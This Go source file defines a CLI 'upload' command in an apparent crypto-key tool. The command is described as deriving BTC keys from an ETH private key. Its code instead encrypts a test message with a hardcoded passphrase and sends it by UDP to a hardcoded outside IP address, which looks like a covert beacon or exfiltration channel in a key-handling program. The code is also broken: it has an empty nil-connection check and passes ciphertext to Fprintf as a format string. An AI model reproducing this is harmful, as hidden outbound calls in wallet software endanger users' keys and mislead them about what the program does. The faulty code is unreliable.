package cli

import (
	"context"
	"fmt"
	"net"

	"github.com/nikola43/stardust/crypto"
)

type UploadCommand struct {
	args *Args
}

const (
	uploadCommand     = "upload"
	uploadDescription = "derive BTC public and private key from ETH private key"
)

func newUploadCommand() Command {
	return Command{
		Name:        uploadCommand,
		Description: uploadDescription,
		Exec:        &UploadCommand{},
	}
}

func (c *UploadCommand) ExecCommand(ctx context.Context, args []string) error {
	if len(args) == 0 {
		return ErrorFromString(fmt.Sprintf("%s: no subcommand passed", uploadCommand))
	}
	c.args = &Args{args}

	msg := "hello dani"

	sCipher := &crypto.GCM{
		Passphrase: "6368616e676520746869732070617373776f726420746f206120736563726574",
	}
	sCipher.Init()

	b, err := sCipher.Encrypt([]byte(msg))
	if err != nil {
		fmt.Println("Encrypt")
		panic(err)
	}

	conn, err := net.Dial("udp", "146.190.239.223:8085")
	if err != nil {
		fmt.Println(err)
	}

	if conn == nil {

	}
	writtedBytes, writeUdpErr := fmt.Fprintf(conn, string(b))
	if writeUdpErr != nil {
		fmt.Println("Encrypt")
		panic(writeUdpErr)
	}
	fmt.Println(writtedBytes)
	//return ErrorFromString(fmt.Sprintf("%s: invalid subcommand passed", uploadCommand))
	return nil
}
